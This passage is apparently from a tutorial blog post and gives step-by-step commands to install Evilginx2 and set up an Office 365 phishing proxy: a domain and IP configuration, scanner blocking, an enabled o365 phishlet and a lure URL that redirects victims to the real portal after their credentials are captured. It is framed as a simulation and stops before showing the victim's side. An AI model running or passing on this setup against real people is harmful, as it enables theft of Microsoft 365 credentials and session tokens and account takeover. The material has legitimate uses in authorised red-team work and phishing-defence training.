Before proceeding with the installation of Evilginx, let’s ensure that wget is installed on the VPS.

sudo apt update 
sudo apt install wget -y

Next, let’s download the Go installation files.
wget https://golang.org/dl/go1.17.linux-amd64.tar.gz

Install Go by executing the following command:
sudo tar -zxvf go1.17.linux-amd64.tar.gz -C /usr/local/

Next, configure the PATH environment variable by running:
echo "export PATH=/usr/local/go/bin:${PATH}" | sudo tee /etc/profile.d/go.sh 
source /etc/profile.d/go.sh

Execute the following commands to clone the source files from GitHub:
sudo apt-get -y install git make 
git clone https://github.com/BakkerJan/evilginx2.git 
cd evilginx2 
make

After completing the cloning process, we can proceed to install Evilginx globally and run it.
sudo make install 
sudo evilginx

Now it is time to configure evilginx. We are going to simulate this with a Microsoft 365 account. For my domain, I am doing evilginxtest.shop. For my IP, it is: 52.144.47.242

config domain <yourdomain> 
config ip <yourIP> 
blacklist unauth

Next, let’s configure the Office 365 phishlet to match our domain.
phishlets hostname o365 <yourdomain> 
phishlets enable o365

If you encounter an SSL/TLS error at this stage, it indicates that your DNS records are not yet in place. When a phishlet is enabled, Evilginx attempts to obtain a free SSL certificate from LetsEncrypt for the new domain.
However, this process requires the domain to be accessible. Once the new SSL certificate is successfully activated, you can anticipate some traffic from scanners. If you’ve previously adjusted the blacklist to “unauth,” these scanners will be blocked.

In the next step, we’ll set the lure for the Office 365 phishlet and define the redirect URL. This URL comes into play after the credentials are phished and can be customized according to your preferences. For this example, we’ll use https://portal.office.com/.

lures create o365 
lures edit 0 redirect_url https://portal.office.com 
lures get-url 0

Our phishlet is now active and accessible via the URL https://login.evilginxtest.shop/RdgjuhBs (no longer active). When accessing the URL from the lure, you’ll be treated as an authenticated session, thus avoiding being blocked. 

Let us see what happens when a user goes to this link 




